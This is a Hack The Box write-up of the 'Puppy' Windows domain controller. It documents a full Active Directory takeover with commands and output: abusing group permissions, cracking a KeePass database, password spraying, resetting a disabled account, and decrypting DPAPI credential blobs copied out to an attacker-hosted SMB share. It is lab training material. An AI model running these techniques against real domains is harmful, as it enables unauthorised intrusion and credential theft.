---
title: "Hack The Box: Puppy"
date: 2025-11-27
summary: "A Medium Windows-based machine where the target is compromised by abusing group write permissions to access a restricted SMB share containing an encrypted KeePass database. Cracking the database reveals user credentials that allow resetting a disabled developer account password for initial WinRM access. Inspecting site backups on disk exposes secondary user credentials, which are then used to decrypt stored DPAPI credential blobs to recover Domain Administrator credentials."
platform: "Hack The Box"
type: "Offensive Machine"
os: "Windows"
difficulty: "Medium"
link: "https://app.hackthebox.com/machines/Puppy"
tags:
  - ace-genericall
  - ace-genericwrite
  - active-directory
  - bloodhound
  - bloodhound-ce-python
  - bloodyad
  - credentials-in-backups
  - dpapi-credentials
  - evil-winrm
  - hashcat
  - impacket-dpapi
  - impacket-smbserver
  - keepass2john
  - keepassxc
  - net-rpc
  - netexec
  - nmap
  - password-spraying
  - rpcclient
  - smbclient
---

### Provided Information

Attacker IP: 10.10.14.125

Target IP: 10.129.232.75

Provided Credentials: `levi.james:KingofAkron2025!`

### Nmap Scan

```bash
$ nmap -sCV -vv -oN nmap/top-tcp 10.129.232.75
<SNIP>
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-11-26 21:34:05Z)
111/tcp  open  rpcbind       syn-ack ttl 127 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 127
3260/tcp open  iscsi?        syn-ack ttl 127
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 127
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2025-11-26T21:36:00
|_  start_date: N/A
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 32931/tcp): CLEAN (Timeout)
|   Check 2 (port 11843/tcp): CLEAN (Timeout)
|   Check 3 (port 19274/udp): CLEAN (Timeout)
|   Check 4 (port 28111/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: 0s
<SNIP>
```

The target is a Domain Controller given the running services.

### Enumerating SMB

Let’s check what SMB shares can Levi access.

Before that, let’s create a hosts file for `/etc/hosts` and sync the system clock with the target clock:

```bash
$ netexec smb 10.129.232.75 --generate-hosts-file hosts
SMB         10.129.232.75   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)

$ cat hosts | sudo tee -a /etc/hosts
10.129.232.75     DC.PUPPY.HTB PUPPY.HTB DC
```

```bash
$ sudo ntpdate 10.129.232.75
2025-11-27 01:33:46.347152 (+0400) +10804.275334 +/- 0.098478 10.129.232.75 s1 no-leap
CLOCK: time stepped by 10804.275334
```

Now let’s check the shares:

```bash
$ netexec smb puppy.htb -u levi.james -p 'KingofAkron2025!' --shares
SMB         10.129.232.75   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         10.129.232.75   445    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025!
SMB         10.129.232.75   445    DC               [*] Enumerated shares
SMB         10.129.232.75   445    DC               Share           Permissions     Remark
SMB         10.129.232.75   445    DC               -----           -----------     ------
SMB         10.129.232.75   445    DC               ADMIN$                          Remote Admin
SMB         10.129.232.75   445    DC               C$                              Default share
SMB         10.129.232.75   445    DC               DEV                             DEV-SHARE for PUPPY-DEVS
SMB         10.129.232.75   445    DC               IPC$            READ            Remote IPC
SMB         10.129.232.75   445    DC               NETLOGON        READ            Logon server share
SMB         10.129.232.75   445    DC               SYSVOL          READ            Logon server share
```

There is an non-default share called Dev, but it seems that Levi can’t access it.

### Bloodhound

Let’s map the domain with `bloodhound`.

First, let’s collect data for it using `bloodhound-ce-python`:

```bash
$ bloodhound-ce-python -d puppy.htb -u levi.james -p 'KingofAkron2025!' -ns 10.129.232.75 -c all --zip
<SNIP>
INFO: Compressing output into 20251127013602_bloodhound.zip
```

Then let’s run `bloodhound`, import the data into it, mark Levi as owned, and see where can we go:

![Figure 1](/assets/images/writeups/hack-the-box-puppy/hack-the-box-puppy-fig-2.png)

<figcaption class="blog-image-caption">Figure 1</figcaption>

Notice how Levi is part of the HR group which has GenericWrite permission over the Developers group.

From the description of the Dev share, it seems to be accessible by users in the Developers group, so let’s become one of them!

### Cracking a Keepass File and Exploiting Ant

Let’s abuse that GenericWrite permission by adding ourself into the Developers group:

```bash
$ net rpc group addmem "Developers" "levi.james" -U "puppy.htb"/"levi.james"%'KingofAkron2025!' -S "10.129.232.75"
```

Now let’s try accessing the Dev share:

```bash
$ smbclient //puppy.htb/dev -U 'levi.james%KingofAkron2025!'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Thu Nov 27 03:09:25 2025
  ..                                  D        0  Sat Mar  8 20:52:57 2025
  KeePassXC-2.7.9-Win64.msi           A 34394112  Sun Mar 23 11:09:12 2025
  Projects                            D        0  Sat Mar  8 20:53:36 2025
  recovery.kdbx                       A     2677  Wed Mar 12 06:25:46 2025
```

Nice, access granted.

Let’s download all of these files recursively:

```bash
smb: \> prompt off
smb: \> recurse on
smb: \> mget *
<SNIP>
```

```bash
$ tree
.
├── KeePassXC-2.7.9-Win64.msi
├── Projects
└── recovery.kdbx
```

The most interesting finding is the Keepass file.

It is likely protected by some password, so let’s extract its hash using `keepass2john`:

```bash
$ keepass2john recovery.kdbx
! recovery.kdbx : File version '40000' is currently not supported!
```

It seems that the available version of `keepass2john` doesn’t support this Keepass version.

However, [this version](https://github.com/ivanmrsulja/keepass2john) succeeded in hash extraction:

```bash
$ python3 keepass2john.py recovery.kdbx
recovery.kdbx:$keepass$*4*37*ef636ddf*67108864*19*4*bf70d9<REDACTED>
```

Let’s save it into a file and crack it with `hashcat`:

```bash
$ echo 'recovery.kdbx:$keepass$*4*37*ef636ddf*67108864*19*4*bf70d9<REDACTED>' > keepass.hash
```

```bash
$ hashcat keepass.hash /usr/share/wordlists/rockyou.txt                     
<SNIP>

$keepass$*4*37*ef636ddf*67108864*19*4*recovery.kdbx:$keepass$*4*37*ef636ddf*67108864*19*4*bf70d9<REDACTED>:liv<REDACTED>
                                                          
Session..........: hashcat
Status...........: Cracked
<SNIP>
```

Successfully cracked.

Now let’s check the contents of the Keepass file:

```bash
$ keepassxc recovery.kdbx
```

![Figure 2](/assets/images/writeups/hack-the-box-puppy/hack-the-box-puppy-fig-3.png)

<figcaption class="blog-image-caption">Figure 2</figcaption>

The file contains 5 sets of credentials.

Since no formatted usernames are provided, let’s grab a list of all usernames from `rpcclient`:

```bash
$ rpcclient -U 'levi.james%KingofAkron2025!' puppy.htb
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[levi.james] rid:[0x44f]
user:[ant.edwards] rid:[0x450]
user:[adam.silver] rid:[0x451]
user:[jamie.williams] rid:[0x452]
user:[steph.cooper] rid:[0x453]
user:[steph.cooper_adm] rid:[0x457]
```

Three of the users in the Keepass file are real domain users, while the other two don’t seem to be.

Let’s save those usernames into a file and spray all found passwords on them:

```bash
$ netexec smb puppy.htb -u usernames -p passwords --continue-on-success
SMB         10.129.232.75   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\Administrator:KingofAkron2025! STATUS_LOGON_FAILURE
SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\Guest:KingofAkron2025! STATUS_LOGON_FAILURE
SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\krbtgt:KingofAkron2025! STATUS_LOGON_FAILURE
SMB         10.129.232.75   445    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025!
SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\ant.edwards:KingofAkron2025! STATUS_LOGON_FAILURE
SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\adam.silver:KingofAkron2025! STATUS_LOGON_FAILURE
SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\jamie.williams:KingofAkron2025! STATUS_LOGON_FAILURE
SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\steph.cooper:KingofAkron2025! STATUS_LOGON_FAILURE
SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\steph.cooper_adm:KingofAkron2025! STATUS_LOGON_FAILURE
SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\Administrator:Ste<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\Guest:Ste<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\krbtgt:Ste<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\ant.edwards:Ste<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\adam.silver:Ste<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\jamie.williams:Ste<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\steph.cooper:Ste<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\steph.cooper_adm:Ste<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\Administrator:ILY<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\Guest:ILY<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\krbtgt:ILY<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\ant.edwards:ILY<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\adam.silver:ILY<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\jamie.williams:ILY<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\steph.cooper:ILY<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\steph.cooper_adm:ILY<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\Administrator:Jam<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\Guest:Jam<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\krbtgt:Jam<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\ant.edwards:Jam<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\adam.silver:Jam<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\jamie.williams:Jam<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\steph.cooper:Jam<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\steph.cooper_adm:Jam<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\Administrator:Ant<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\Guest:Ant<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\krbtgt:Ant<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.232.75   445    DC               [+] PUPPY.HTB\ant.edwards:Ant<REDACTED>
SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\adam.silver:Ant<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\jamie.williams:Ant<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\steph.cooper:Ant<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\steph.cooper_adm:Ant<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\Administrator:HJK<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\Guest:HJK<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\krbtgt:HJK<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\adam.silver:HJK<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\jamie.williams:HJK<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\steph.cooper:HJK<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\steph.cooper_adm:HJK<REDACTED> STATUS_LOGON_FAILURE
```

We got one hit on Ant.

Let’s add Ant to owned users in `bloodhound` and see what can it access:

![Figure 3](/assets/images/writeups/hack-the-box-puppy/hack-the-box-puppy-fig-4.png)

<figcaption class="blog-image-caption">Figure 3</figcaption>

As seen, Ant is part of Senior Dev group which has GenericAll permission over Adam, and Adam can WinRM. That’s our path to initial foothold.

### Exploiting Adam

Let’s abuse the GenericAll permission over Adam by resetting its password using `net rpc`:

```bash
$ net rpc password "adam.silver" 'Password1!' -U "puppy.htb"/'ant.edwards'%'Ant<REDACTED>' -S "10.129.232.75"
```

Now let’s verify the reset:

```bash
$ netexec smb puppy.htb -u adam.silver -p 'Password1!'
SMB         10.129.232.75   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\adam.silver:Password1! STATUS_ACCOUNT_DISABLED
```

It seems that the account is disabled.

The disable can be removed using multiple tools such as `ldapmodify` or `bloodyAD`. `bloodyAD` is simpler so let’s go with it:

```bash
$ bloodyAD -u ant.edwards -p 'Ant<REDACTED>' --host dc.puppy.htb -d puppy.htb remove uac adam.silver -f ACCOUNTDISABLE
[-] ['ACCOUNTDISABLE'] property flags removed from adam.silver's userAccountControl

$ netexec smb puppy.htb -u adam.silver -p 'Password1!'
SMB         10.129.232.75   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         10.129.232.75   445    DC               [+] PUPPY.HTB\adam.silver:Password1!
```

Nice.

### RCE as Adam

Now let’s use `evil-winrm` to gain RCE as Adam and read `user.txt`:

```bash
$ evil-winrm -i puppy.htb -u adam.silver -p 'Password1!'
<SNIP>
*Evil-WinRM* PS C:\Users\adam.silver\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\adam.silver\Desktop> ls

    Directory: C:\Users\adam.silver\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         2/28/2025  12:31 PM           2312 Microsoft Edge.lnk
-ar---        11/26/2025   1:30 PM             34 user.txt

*Evil-WinRM* PS C:\Users\adam.silver\Desktop> cat user.txt
5142ae<REDACTED>
```

### Basic Enumeration

Adam doesn’t have anything special in terms of privileges:

```bash
*Evil-WinRM* PS C:\Users\adam.silver\Desktop> whoami /all

USER INFORMATION
----------------

User Name         SID
================= ==============================================
puppy\adam.silver S-1-5-21-1487982659-1829050783-2281216199-1105

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                            Attributes
=========================================== ================ ============================================== ==================================================
Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
PUPPY\DEVELOPERS                            Group            S-1-5-21-1487982659-1829050783-2281216199-1113 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

### Exploiting Steph

There is an interesting folder in the root directory:

```bash
*Evil-WinRM* PS C:\> ls

    Directory: C:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          5/9/2025  10:48 AM                Backups
d-----         5/12/2025   5:21 PM                inetpub
d-----          5/8/2021   1:20 AM                PerfLogs
d-r---         7/24/2025  12:30 PM                Program Files
d-----          5/8/2021   2:40 AM                Program Files (x86)
d-----          3/8/2025   9:00 AM                StorageReports
d-r---        11/26/2025   3:31 PM                Users
d-----         5/13/2025   4:40 PM                Windows
```

Let’s check its contents:

```bash
*Evil-WinRM* PS C:\> cd backups
*Evil-WinRM* PS C:\backups> ls

    Directory: C:\backups

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          3/8/2025   8:22 AM        4639546 site-backup-2024-12-30.zip
```

Interesting. A backup ZIP.

Let’s download it and check its contents:

```bash
*Evil-WinRM* PS C:\backups> download site-backup-2024-12-30.zip

Info: Downloading C:\backups\site-backup-2024-12-30.zip to site-backup-2024-12-30.zip

Info: Download successful!
```

```bash
$ unzip site-backup-2024-12-30.zip
<SNIP>

$ tree .
.
├── puppy
│   ├── assets
│   │   ├── css
│   │   │   ├── fontawesome-all.min.css
│   │   │   ├── images
│   │   │   │   ├── highlight.png
│   │   │   │   └── overlay.png
│   │   │   └── main.css
│   │   ├── js
│   │   │   ├── breakpoints.min.js
│   │   │   ├── browser.min.js
│   │   │   ├── jquery.dropotron.min.js
│   │   │   ├── jquery.min.js
│   │   │   ├── jquery.scrolly.min.js
│   │   │   ├── main.js
│   │   │   └── util.js
│   │   ├── sass
│   │   │   ├── libs
│   │   │   │   ├── _breakpoints.scss
│   │   │   │   ├── _functions.scss
│   │   │   │   ├── _html-grid.scss
│   │   │   │   ├── _mixins.scss
│   │   │   │   ├── _vars.scss
│   │   │   │   └── _vendor.scss
│   │   │   └── main.scss
│   │   └── webfonts
│   │       ├── fa-brands-400.eot
│   │       ├── fa-brands-400.svg
│   │       ├── fa-brands-400.ttf
│   │       ├── fa-brands-400.woff
│   │       ├── fa-brands-400.woff2
│   │       ├── fa-regular-400.eot
│   │       ├── fa-regular-400.svg
│   │       ├── fa-regular-400.ttf
│   │       ├── fa-regular-400.woff
│   │       ├── fa-regular-400.woff2
│   │       ├── fa-solid-900.eot
│   │       ├── fa-solid-900.svg
│   │       ├── fa-solid-900.ttf
│   │       ├── fa-solid-900.woff
│   │       └── fa-solid-900.woff2
│   ├── images
│   │   ├── adam.jpg
│   │   ├── antony.jpg
│   │   ├── banner.jpg
│   │   ├── jamie.jpg
│   │   └── Levi.jpg
│   ├── index.html
│   └── nms-auth-config.xml.bak
└── site-backup-2024-12-30.zip

10 directories, 41 files
```

Nothing is too interesting except for the `.bak` file.

Let’s check its contents:

```bash
$ cat puppy/nms-auth-config.xml.bak
<?xml version="1.0" encoding="UTF-8"?>
<ldap-config>
    <server>
        <host>DC.PUPPY.HTB</host>
        <port>389</port>
        <base-dn>dc=PUPPY,dc=HTB</base-dn>
        <bind-dn>cn=steph.cooper,dc=puppy,dc=htb</bind-dn>
        <bind-password>Che<REDACTED></bind-password>
    </server>
<SNIP>
```

Nice, a new set of credentials!

### RCE as Steph

Let’s check what can Steph do in the domain:

![Figure 4](/assets/images/writeups/hack-the-box-puppy/hack-the-box-puppy-fig-5.png)

<figcaption class="blog-image-caption">Figure 4</figcaption>

Nothing too exceptional, the user can WinRM but not much more.

Let’s use `evil-winrm` to gain RCE and see where can we go:

```bash
$ evil-winrm -i puppy.htb -u steph.cooper -p 'ChefSteph2025!'

<SNIP>
*Evil-WinRM* PS C:\Users\steph.cooper\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

The user doesn’t have special privileges.

### DPAPI and Exploiting Administrative Steph

As part of enumeration, it can be seen that there are hidden encrypted credentials stored in the credentials manager in Steph’s directory:

```bash
*Evil-WinRM* PS C:\Users\steph.cooper\appdata\Roaming\Microsoft\Credentials> ls -force

    Directory: C:\Users\steph.cooper\appdata\Roaming\Microsoft\Credentials

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          3/8/2025   7:54 AM            414 C8D69EBE9A43E9DEBF6B5FBD48B521B9
```

The decryption key is found in the Protect directory:

```bash
*Evil-WinRM* PS C:\Users\steph.cooper\appdata\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107> ls -force

    Directory: C:\Users\steph.cooper\appdata\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          3/8/2025   7:40 AM            740 556a2412-1275-4ccf-b721-e6a0b4f90407
-a-hs-         2/23/2025   2:36 PM             24 Preferred
```

Let’s extract these files and decrypt them using `impacket-dpapi`:

```bash
*Evil-WinRM* PS C:\Users\steph.cooper\appdata\Roaming\Microsoft\Credentials> download C8D69EBE9A43E9DEBF6B5FBD48B521B9

Info: Downloading C:\Users\steph.cooper\appdata\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9 to C8D69EBE9A43E9DEBF6B5FBD48B521B9

Error: Download failed. Check filenames or paths: uninitialized constant WinRM::FS::FileManager::EstandardError
```

For some reason `evil-winrm` refused to download them.

Let’s work around that by setting and mounting an SMB share using `impacket-smbserver`:

```bash
$ impacket-smbserver -smb2support share . -user test -password test
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```

```bash
*Evil-WinRM* PS C:\Users\steph.cooper\appdata\Roaming\Microsoft\Credentials> net use Z: \\10.10.14.125\share /user:test test
The command completed successfully.

*Evil-WinRM* PS C:\Users\steph.cooper\appdata\Roaming\Microsoft\Credentials> copy C:\Users\steph.cooper\appdata\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9 Z:\

*Evil-WinRM* PS C:\Users\steph.cooper\appdata\Roaming\Microsoft\Credentials> copy C:\Users\steph.cooper\appdata\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407 Z:\
```

Now let’s decrypt the files:

```bash
$ impacket-dpapi masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 -sid S-1-5-21-1487982659-1829050783-2281216199-1107 -password 'Che<REDACTED>'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 556a2412-1275-4ccf-b721-e6a0b4f90407
Flags       :        0 (0)
Policy      : 4ccf1275 (1288639093)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd9a5<REDACTED>
```

```bash
$ impacket-dpapi credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0xd9a5<REDACTED>
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[CREDENTIAL]
LastWritten : 2025-03-08 15:54:29+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=PUPPY.HTB
Description :
Unknown     :
Username    : steph.cooper_adm
Unknown     : Five<REDACTED>
```

Nice, it seems that we got some administrative credentials!

Let’s verify them:

```bash
$ netexec smb puppy.htb -u steph.cooper_adm -p 'Five<REDACTED>'
SMB         10.129.232.75   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         10.129.232.75   445    DC               [+] PUPPY.HTB\steph.cooper_adm:Five<REDACTED> (Pwn3d!)
```

Very nice.

Let’s check what can this user do:

![Figure 5](/assets/images/writeups/hack-the-box-puppy/hack-the-box-puppy-fig-6.png)

<figcaption class="blog-image-caption">Figure 5</figcaption>

I believe this is enough to announce that the domain is fully compromised.

Surely it must be able to do so, but let’s verify that the user can WinRM:

```bash
$ netexec winrm puppy.htb -u steph.cooper_adm -p Five<REDACTED>
WINRM       10.129.232.75   5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:PUPPY.HTB)
WINRM       10.129.232.75   5985   DC               [+] PUPPY.HTB\steph.cooper_adm:Five<REDACTED> (Pwn3d!)
```

Perfect.

### RCE as Administrative Steph

Let’s use `evil-winrm` to establish a shell and grab the `root.txt` file from Administrator’s desktop:

```bash
$ evil-winrm -i puppy.htb -u steph.cooper_adm -p 'Five<REDACTED>'
<SNIP>
*Evil-WinRM* PS C:\Users\steph.cooper_adm\Documents> cd /users/administrator/desktop
*Evil-WinRM* PS C:\users\administrator\desktop> ls

    Directory: C:\users\administrator\desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---        11/26/2025   1:30 PM             34 root.txt

*Evil-WinRM* PS C:\users\administrator\desktop> cat root.txt
924812<REDACTED>
```
